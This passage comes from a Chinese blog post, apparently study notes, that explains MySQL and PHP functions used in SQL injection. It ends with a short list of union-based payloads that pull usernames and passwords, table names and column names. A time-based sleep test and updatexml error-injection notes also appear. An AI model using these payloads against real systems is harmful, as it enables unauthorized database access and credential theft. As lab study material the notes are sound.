个字节。</p>\n<h2 id=\"substr\"><a class=\"anchor\" href=\"#substr\">#</a> substr()</h2>\n<p>mysql substr () 函数<br />\n截取字符串</p>\n<p>用法：substr (string string,num start,num length);</p>\n<p>select  substr (参数 1，参数 2，参数 3)  from  表名<br />\n string 为字符串；start 为起始位置；length 为长度。</p>\n<p>注意：mysql 中的 start 是从 1 开始的。</p>\n<p>SUBSTR () 函数是 SUBSTRING () 函数的同义词，所以可以互换使用它们</p>\n<h2 id=\"sleep\"><a class=\"anchor\" href=\"#sleep\">#</a> sleep()</h2>\n<h2 id=\"benchmark\"><a class=\"anchor\" href=\"#benchmark\">#</a> benchmark()</h2>\n<pre><code>\nBENCHMARK(count,expr)   \nBENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。   \nmysql&gt; select BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;));   \n+----------------------------------------------+   \n| BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;)) |   \n+----------------------------------------------+   \n| 0                                            |   \n+----------------------------------------------+   \n1 row in set (4.74 sec)  \n\n</code></pre>\n<h2 id=\"ifexpr1expr2expr3\"><a class=\"anchor\" href=\"#ifexpr1expr2expr3\">#</a> if(expr1,expr2,expr3)</h2>\n<p>if(length(database())&gt;5,sleep(5),1)</p>\n<h2 id=\"datadir\"><a class=\"anchor\" href=\"#datadir\">#</a> @@datadir</h2>\n<p>数据库文件所在位置</p>\n<h2 id=\"version_compile_os\"><a class=\"anchor\" href=\"#version_compile_os\">#</a> @@version_compile_os</h2>\n<p>查看当前操作系统</p>\n<h2 id=\"concat\"><a class=\"anchor\" href=\"#concat\">#</a> concat()</h2>\n<p>语法及使用特点：<br />\nCONCAT(str1,str2,…)<br />\n 返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。</p>\n<h2 id=\"concat_ws\"><a class=\"anchor\" href=\"#concat_ws\">#</a> concat_ws()</h2>\n<p>使用函数 CONCAT_WS（）。使用语法为：CONCAT_WS (separator,str1,str2,…)<br />\n CONCAT_WS () 代表 CONCAT With Separator ，是 CONCAT () 的特殊形式。第一个参数是其它参数的分隔符。分<br />\n隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，<br />\n则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS () 不会忽略任何空字符串。 (然而会<br />\n忽略所有的 NULL）。<br />\n如 SELECT CONCAT_WS ('_',id,name) AS con_ws FROM info LIMIT 1; 返回结果为</p>\n<pre><code>+----------+\n| con_ws   |\n+----------+\n| 1_BioCyc |\n+----------+\n</code></pre>\n<h2 id=\"group_concat\"><a class=\"anchor\" href=\"#group_concat\">#</a> group_concat()</h2>\n<p>区分 concat_ws () 与 group_concat () 函数<br />\n concat_ws (char (32,58,32),user (),database (),version ())<br />\n 在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p>\n<p>group_connect () 函数<br />\n完整的语法如下：<br />\ngroup_concat ([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br />\n 功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果<br />\n说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 子句；separator 是一个字符串值，缺省为一个逗号。</p>\n<p>图一，区别<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>报错注入<br />\n 0x7e  ASCII    ~</p>\n<p>updatexml () 是更新 xml 文档的函数</p>\n<p>语法 updatexml (目标 xml 文档，xml 路径，更新的内容)<br />\n<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php</h2>\n<h3 id=\"preg_math\"><a class=\"anchor\" href=\"#preg_math\">#</a> preg_math()</h3>\n<h3 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor()</h3>\n<p>语法<br />\n floor (x)<br />\n 返回不大于 x 的下一个整数，将 x 的小数部分舍去取整。floor () 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>//输出：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-6</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-6</pre></td></tr></table></figure><p>html 实体编码</p>\n</font>\n<h1 id=\"sql-injection-payload\"><a class=\"anchor\" href=\"#sql-injection-payload\">#</a> SQL injection payload</h1>\n<p>用户名 密码<br />\n数字型</p>\n<p><code>?id=-1 union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),(@@datadir)</code></p>\n<p>字段名</p>\n<p><code>?id=-1 union select 1,2,(select group_concat(column_name separator '&lt;br&gt;') from information_schema.columns where table_name='users')</code></p>\n<p>表名<br />\n <code>?id=-1 union select 1,(select group_concat(table_name separator '&lt;br&gt;') from information_schema.tables where table_schema=database()),3</code></p>\n<p>单引号括号<br />\n <code>?id=-1') union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),3 --+</code></p>\n",
            "tags": [
                "sql注入"
            ]
        }
    ]
}